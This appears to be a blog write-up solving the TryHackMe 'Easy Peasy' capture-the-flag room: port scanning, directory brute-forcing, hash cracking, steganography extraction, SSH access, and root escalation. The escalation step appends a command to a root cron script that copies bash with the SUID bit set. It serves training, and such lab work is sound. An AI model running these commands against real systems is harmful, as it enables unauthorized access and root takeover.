---
title: THM | Easy Peasy
date: 2023-12-18 09:24:00 +0530
categories: [Nmap and GoBuster]
tags: [cronjob, John The Ripper] 
---

Tryhackme Room: [https://tryhackme.com/easypeasyctf](https://tryhackme.com/room/easypeasyctf)

# Reconnaisance

## Nmap

```
nmap -sS -T4 -p1-65535 -sV 10.10.3.41
```

```
Nmap scan report for 10.10.3.41
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Open Ports

- 80 http
- 6498 ssh
- 65524 http

## Port 80 (HTTP)

The web server is showing default nginx page.

![d66abc272c62094382155ae592c9f960.png](/Tryhackme/EasyPeasy/_resources/d66abc272c62094382155ae592c9f960.png)

Next we will use gobuster utility to find hidden files and directories.

```
gobuster dir -u http://10.10.3.41/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 250 -x php,htnl,txt

```

We Found the following result.

```
/robots.txt           (Status: 200) [Size: 43]
/hidden               (Status: 301) [Size: 169]
```

We found the /hidden directory, so we will open this directory in the browser.

![c9b04fb70a1843627e1b33ae0906645e.png](/Tryhackme/EasyPeasy/_resources/c9b04fb70a1843627e1b33ae0906645e.png)

Nothing interseting found in the webpage and the source code. So, we will run gobuster again in this directory.

```
gobuster dir -u http://10.10.3.41/hidden/ -w /usr/share/wordlists/dirb/common.txt -t 250
```

We found the following result.

```
/index.html           (Status: 200) [Size: 390]
/whatever             (Status: 301) [Size: 169] 
```

Next we will browse this /whatever directory and check the source code.

![18ad9e0a9e314c06ab28c46ace0b1efe.png](/Tryhackme/EasyPeasy/_resources/18ad9e0a9e314c06ab28c46ace0b1efe.png)

![03723e1e52824e7b99414511279927a7.png](/Tryhackme/EasyPeasy/_resources/03723e1e52824e7b99414511279927a7.png)

We found a base64 encoded string. So, lets decode it.

![f45ea9db7dbf39b3a663df4ffe3cb464.png](/Tryhackme/EasyPeasy/_resources/f45ea9db7dbf39b3a663df4ffe3cb464.png)

We found our first flag.

Nex we will move to the other http web server running apache on port 65526.

## Port 65524 (HTTP)

The web server running default Apache and we are displayed with default page.

![b501aee346c65354d1b72058a39bc530.png](/Tryhackme/EasyPeasy/_resources/b501aee346c65354d1b72058a39bc530.png)

By closely looking at the page we found a flag3.

![7fc99c3f88b3954330c255bd4ba7fad9.png](/Tryhackme/EasyPeasy/_resources/7fc99c3f88b3954330c255bd4ba7fad9.png)

Next, we will run gobuster and look for hidden directories and files
```
gobuster dir -u http://10.10.219.20:65524/ -w /usr/share/wordlists/dirb/common.txt -t 250
```

Nothing interesting found except `/robots.txt`. 

We found a MD5 hash in the robots.txt file and further we cracked it online

![93fc6b5d284521fb5d92cae282ceac3f.png](/Tryhackme/EasyPeasy/_resources/93fc6b5d284521fb5d92cae282ceac3f.png)

![dee1f5ce0f5ef7a253492eadc33d9bb7.png](/Tryhackme/EasyPeasy/_resources/dee1f5ce0f5ef7a253492eadc33d9bb7.png)

Then, we checked the source page of the apache defualt page, where we got base62 decoded string.

![cbe8549b674ffe17544ffe2805a9181b.png](/Tryhackme/EasyPeasy/_resources/cbe8549b674ffe17544ffe2805a9181b.png)

We decoded the above string and found our hidden directory.

![289808b48432c9fb7331d16453aa74b5.png](/Tryhackme/EasyPeasy/_resources/289808b48432c9fb7331d16453aa74b5.png)

Then, We accessed the hidden directory and found a hash in the source page.

![574a67f9643460139285933bb0d0a487.png](/Tryhackme/EasyPeasy/_resources/574a67f9643460139285933bb0d0a487.png)

![89a92702225a908bf46f78cd1d693e09.png](/Tryhackme/EasyPeasy/_resources/89a92702225a908bf46f78cd1d693e09.png)

As the provided wordlist is recomended to crack the hash, we will do the same.

```
john --format=gost --wordlist=easypeasy.txt hash3.txt
```

![cc7d96d3698ae888a8e4db164a32a66f.png](/Tryhackme/EasyPeasy/_resources/cc7d96d3698ae888a8e4db164a32a66f.png)
 
 Or we can crack it online using `https://md5hashing.net/`
 
 ![01ddd1c46521ddff29beee03e8d24ebc.png](/Tryhackme/EasyPeasy/_resources/01ddd1c46521ddff29beee03e8d24ebc.png)
 
 As, we require password for the SSH login. Next, with the previously cracked password, we will try to extract any hidden information in the image file named `binarycodepixabay.jpg`.
 
 Extracted secret text file using `steghide` tool.
 
 ```
 steghide extract -sf binarycodepixabay.jpg 
 ```
 ![de3b4a553e2b671266d8f5957d50be8e.png](/Tryhackme/EasyPeasy/_resources/de3b4a553e2b671266d8f5957d50be8e.png)
 
 Then, we converted the binary to text and the password.
 
 ![236d137c4d2437cebc01d07fcc85901d.png](/Tryhackme/EasyPeasy/_resources/236d137c4d2437cebc01d07fcc85901d.png)
 

# Initial Foothold

 
So, after getting the credential to login, we ssh to the machine and got the user flag.
 
 ```
 ssh boring@10.10.219.20 -p 6498
```

![9ca9b1256c68c455b45add16977013d8.png](/Tryhackme/EasyPeasy/_resources/9ca9b1256c68c455b45add16977013d8.png)

But, we have to decode the cypher text and get our flag.

![ba4c282f6aa223495e7964edbc18c9d7.png](/Tryhackme/EasyPeasy/_resources/ba4c282f6aa223495e7964edbc18c9d7.png)


# PrivEsc

After checking the cron jobs and sudo permissions, we were not getting anything for elevate privilege.
So, we transferred linpeas.sh to the target machine and run the script.

![4e33ba2c1f15c0f0159c42ee68919658.png](/Tryhackme/EasyPeasy/_resources/4e33ba2c1f15c0f0159c42ee68919658.png)

We found the interesting file under /var/www 

![6477b3f9eccbceef736e83eb39ef9b76.png](/Tryhackme/EasyPeasy/_resources/6477b3f9eccbceef736e83eb39ef9b76.png)

Interestingly this script is running by root as cron job.

![6e9dc5eedbd8cf8535268202e3781352.png](/Tryhackme/EasyPeasy/_resources/6e9dc5eedbd8cf8535268202e3781352.png)

So we will add our malicious code to get a copy of bash with suid in the /tmp directory
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> .mysecretcronjob.sh
```

![7bdfcab48ac9db7b5ecaa0b8fdf47409.png](/Tryhackme/EasyPeasy/_resources/7bdfcab48ac9db7b5ecaa0b8fdf47409.png)

Next, We will execute the script and get the root privilege and read the root flag under /root directory

![1b59a4fb29d64a111f68631b4403df5c.png](/Tryhackme/EasyPeasy/_resources/1b59a4fb29d64a111f68631b4403df5c.png)

![60f76851290d31ad26bd98dbf7badaea.png](/Tryhackme/EasyPeasy/_resources/60f76851290d31ad26bd98dbf7badaea.png)